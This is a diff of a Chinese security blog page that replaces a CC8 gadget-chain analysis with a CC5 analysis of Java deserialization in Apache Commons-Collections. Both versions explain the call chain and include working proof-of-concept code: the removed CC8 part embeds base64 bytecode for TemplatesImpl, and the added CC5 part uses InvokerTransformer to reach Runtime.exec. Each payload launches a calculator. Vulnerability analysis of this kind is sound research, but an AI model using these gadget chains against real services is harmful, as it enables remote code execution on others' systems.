@@ -16,28 +16,26 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CC8链：CC2和CC4派生">
+    <meta name="description" content="CC5链：CC1-LazyMap派生">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CC8链分析">
-<meta property="og:url" content="https://3xsh0re.github.io/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="CC5链分析">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="CC8链：CC2和CC4派生">
+<meta property="og:description" content="CC5链：CC1-LazyMap派生">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005214008329.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005220222601.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005223524697.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005223728786.png">
-<meta property="article:published_time" content="2024-10-05T13:16:23.000Z">
-<meta property="article:modified_time" content="2024-10-05T14:43:48.358Z">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/image-20241005230405014.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/image-20241006000640409.png">
+<meta property="article:published_time" content="2024-10-06T05:00:27.000Z">
+<meta property="article:modified_time" content="2024-10-05T16:07:56.112Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="漏洞分析">
 <meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005214008329.png">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/image-20241005230405014.png">
   
   
   
-  <title>CC8链分析 - 3xsh0re&#39;Blog</title>
+  <title>CC5链分析 - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -356,7 +354,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CC8链分析"></span>
+            <span id="subtitle" data-typed-text="CC5链分析"></span>
           
         </div>
 
@@ -367,8 +365,8 @@ mjx-container[display="true"] + br {
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-05 21:16" pubdate>
-          2024年10月5日 晚上
+        <time datetime="2024-10-06 13:00" pubdate>
+          2024年10月6日 下午
         </time>
       </span>
     
@@ -379,7 +377,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.1k 字
+          2.7k 字
         
       </span>
     
@@ -390,7 +388,7 @@ mjx-container[display="true"] + br {
         
         
         
-          26 分钟
+          18 分钟
         
       </span>
     
@@ -435,12 +433,12 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CC8链分析</h1>
+            <h1 id="seo-header">CC5链分析</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年10月5日 晚上
+                    本文最后更新于：2024年10月6日 凌晨
                   
                 
               </p>
@@ -448,41 +446,27 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <p>CC8链：CC2和CC4派生</p>
+                <p>CC5链：CC1-LazyMap派生</p>
 <span id="more"></span>
 
-<p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java">CC8源码</a></p>
-<p>在原始版本的<code>ysoserial</code>中没有这条链。CC8存在于Commons-Collections4.0版本中，使用了<code>TemplatesImpl.newTransformer()</code>作为代码执行点。</p>
-<p>使用<code>PriorityQueue</code>作为入口，它是基于二叉树和堆，即二叉堆这种数据结构来实现。它的<code>readObject()</code>方法中由于要重构二叉堆，会进行二叉树节点的比较从而进入利用链。那么在进行二叉树节点比较的其他地方会不会还存在利用点。</p>
-<p>CC8的作者就想到了红黑树，在Java中实现为<code>TreeMap</code>类，但是POC中使用了<code>TreeBag</code>作为链子入口。为什么呢</p>
-<img src="/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005214008329.png" srcset="/img/loading.gif" lazyload class="">
+<p>前面已经分析到了CC8了，暂停一下回过头来分析暂时抛弃的CC5，CC5也是很简单的一条链，派生于CC1-LazyMap。</p>
+<p>我们看<code>ysoserial</code>源码中<code>CommonsCollections5.java</code>，可以发现就只是更改了一下入口点，<code>BadAttributeValueExpException</code>类</p>
+<img src="/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/image-20241005230405014.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>我们去看<code>TreeMap</code>的源码，在其<code>readObject()</code>中并没有出现调用比较之类的函数，<code>buildFromSorted()</code>也没有调用，那么就不能进入像CC4那样的后续构造</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Reconstitute the {<span class="hljs-doctag">@code</span> TreeMap} instance from a stream (i.e.,</span><br><span class="hljs-comment"> * deserialize it).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException {<br>    <span class="hljs-comment">// Read in the Comparator and any hidden stuff</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read in size</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> s.readInt();<br><br>    buildFromSorted(size, <span class="hljs-literal">null</span>, s, <span class="hljs-literal">null</span>);<br>}<br></code></pre></td></tr></table></figure>
+<p>那我们直接去分析这个新类即可，很简短的一个类，占比较大的甚至是它的<code>readObject</code>方法，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {<br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">"val"</span>, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) {<br>        val = <span class="hljs-literal">null</span>;<br>    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) {<br>        val= valObj;<br>    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) {<br>        val = valObj.toString();<br>    } <span class="hljs-keyword">else</span> { <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">"@"</span> + valObj.getClass().getName();<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
-<p>这个问题如何解决，既然选择使用<code>TreeMap</code>，那就看看<code>TreeMap</code>中还有哪些地方使用了compare，CC8的作者就使用了其<code>put()</code>方法</p>
-<img src="/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005220222601.png" srcset="/img/loading.gif" lazyload class="">
+<p>比较可疑的是<code>valObj.toString()</code>，一个一个来看，首先需要确定的是，这里的<code>valObj</code>就是我们需要构造的类，那么先去看<code>LazyMap</code>，其没有自己实现<code>toString</code>而是直接使用父类<code>AbstractMapDecorator</code>的，但是没有代码执行点，故不行，那会是哪个类呢，想一下之前分析的CC6，其中用到了<code>TiedMapEntry.getValue()</code>方法，去看看其<code>toString</code>，调用了<code>getValue()</code>方法，所以就连上了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets a string version of the entry.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> entry as a string</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {<br>    <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">"="</span> + getValue();<br>}<br></code></pre></td></tr></table></figure>
 
-<p>那么接下来看看这<code>put</code>方法在<code>CommonsCollections4.0</code>中会被谁调用，发现在<code>AbstractMapBag.java</code>中，其<code>doReadObject()</code>方法调用了<code>put</code>方法，</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doReadObject</span><span class="hljs-params">(Map&lt;E, MutableInteger&gt; map, ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {<br>    <span class="hljs-built_in">this</span>.map = map;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">entrySize</span> <span class="hljs-operator">=</span> in.readInt();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; entrySize; ++i) {<br>        <span class="hljs-type">E</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> in.readObject();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> in.readInt();<br>        map.put(obj, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutableInteger</span>(count)); <span class="hljs-comment">//this trigger!</span><br>        <span class="hljs-built_in">this</span>.size += count;<br>    }<br><br>}<br></code></pre></td></tr></table></figure>
+<p>链子很简单：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">BadAttributeValueExpException.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>TiedMapEntry.toString<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>TiedMapEntry.getValue<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>LazyMap.get<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>CC-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<p>那么看看包里有哪个调用了<code>doReadObject</code>，于是乎找到了<code>TreeBag</code>类，在其<code>readObject</code>当中，</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {<br>    in.defaultReadObject();<br>    Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comp = (Comparator)in.readObject();<br>    <span class="hljs-built_in">super</span>.doReadObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>(comp), in);<br>}<br></code></pre></td></tr></table></figure>
+<p>可以构造测试代码：</p>
+<p>这里有值得注意的地方，<code>BadAttributeValueExpException</code>的构造函数，<strong>如果不是非空则直接<code>toString</code>调用将类型强转为<code>String</code>类了，这当然是不行的，所以需要先赋值为null，再通过反射修改私有变量</strong></p>
+<img src="/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/image-20241006000640409.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>到这里CC8就分析完了，后面的部分和CC4差不多了，主要就是分析链子入口点。</p>
-<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript">TreeBag.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>AbstractMapBag.doReadObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>TreeMap.put<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>TransformingComparator.compare<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>ChainedTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>InstantiateTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>TemplatesImpl.newTransformer<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>defineClass<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">-&gt;</span>newInstance()<br></code></pre></td></tr></table></figure>
-
-<p>构造测试代码：</p>
-<p>需要注意一些问题，treeMap中需要有元素，不然在<code>doReadObject</code>中就直接跳过调用了</p>
-<img src="/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005223524697.png" srcset="/img/loading.gif" lazyload class="" title="image-20241005223524697">
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">"3xsh0re"</span>));<br>    <span class="hljs-type">byte</span>[] CalcCode = Base64.getDecoder().decode(<br>            <span class="hljs-string">"yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA"</span> +<br>                    <span class="hljs-string">"CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP"</span> +<br>                    <span class="hljs-string">"TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0a"</span> +<br>                    <span class="hljs-string">"W9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKEx"</span> +<br>                    <span class="hljs-string">"jb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hc"</span> +<br>                    <span class="hljs-string">"GFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS9"</span> +<br>                    <span class="hljs-string">"4bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAA"</span> +<br>                    <span class="hljs-string">"ygpVgcAGwEAClNvdXJjZUZpbGUBABBUZW1wbGF0ZVBPQy5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGM"</span> +<br>                    <span class="hljs-string">"MAB8AIAEAC1RlbXBsYXRlUE9DAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzb"</span> +<br>                    <span class="hljs-string">"HRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnR"</span> +<br>                    <span class="hljs-string">"lcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL"</span> +<br>                    <span class="hljs-string">"2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQA"</span> +<br>                    <span class="hljs-string">"nKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIA"</span> +<br>                    <span class="hljs-string">"AIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAA"</span> +<br>                    <span class="hljs-string">"ABAAAAAGxAAAAAQAKAAAABgABAAAADwALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAA"</span> +<br>                    <span class="hljs-string">"bgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAARAAQAEgANABMACwAAAAQAAQAQAAEAEQAAAAIAEg=="</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">calcTemp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(calcTemp, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] {CalcCode});<br>    setFieldValue(calcTemp, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"CalcTemplatesImpl"</span>);<br>    setFieldValue(calcTemp, <span class="hljs-string">"_tfactory"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Templates.class}, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{calcTemp})<br>    };<br>    <span class="hljs-type">TreeBag</span> <span class="hljs-variable">treeBag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeBag</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain));<br>    treeBag.add(<span class="hljs-string">"3xsh0re"</span>);<br>    setFieldValue(transformerChain,<span class="hljs-string">"iTransformers"</span>,transformers);<br><br>    <span class="hljs-comment">// 测试</span><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>    oos.writeObject(treeBag);<br>    oos.close();<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>    ois.readObject();<br>}<br></code></pre></td></tr></table></figure>
-
-<img src="/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/image-20241005223728786.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>    <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{});<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>    };<br>    <span class="hljs-comment">// 第二层</span><br>    Map&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap,transformerChain);<br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">mapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(innerMap,<span class="hljs-string">"3xsh0re"</span>);<br>    <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">attributeValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(mapEntry);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">"iTransformers"</span>);<br>    f.setAccessible(<span class="hljs-literal">true</span>);<br>    f.set(transformerChain,transformers);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">"val"</span>);<br>    f2.setAccessible(<span class="hljs-literal">true</span>);<br>    f2.set(attributeValue,mapEntry);<br><br>    <span class="hljs-comment">// 测试</span><br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>    oos.writeObject(attributeValue);<br>    oos.close();<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>    ois.readObject();<br>}<br></code></pre></td></tr></table></figure>
 
 
 
@@ -539,8 +523,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CC8链分析</div>
-      <div>https://3xsh0re.github.io/2024/10/05/CC8链分析/</div>
+      <div>CC5链分析</div>
+      <div>https://3xsh0re.github.io/2024/10/06/CC5链分析/</div>
     </div>
     <div class="license-meta">
       
@@ -552,7 +536,7 @@ mjx-container[display="true"] + br {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月5日</div>
+          <div>2024年10月6日</div>
         </div>
       
       
@@ -584,18 +568,12 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/06/CC5%E9%93%BE%E5%88%86%E6%9E%90/" title="CC5链分析">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CC5链分析</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/02/CC7%E9%93%BE%E5%88%86%E6%9E%90/" title="CC7链分析">
-                        <span class="hidden-mobile">CC7链分析</span>
+                      <a href="/2024/10/05/CC8%E9%93%BE%E5%88%86%E6%9E%90/" title="CC8链分析">
+                        <span class="hidden-mobile">CC8链分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
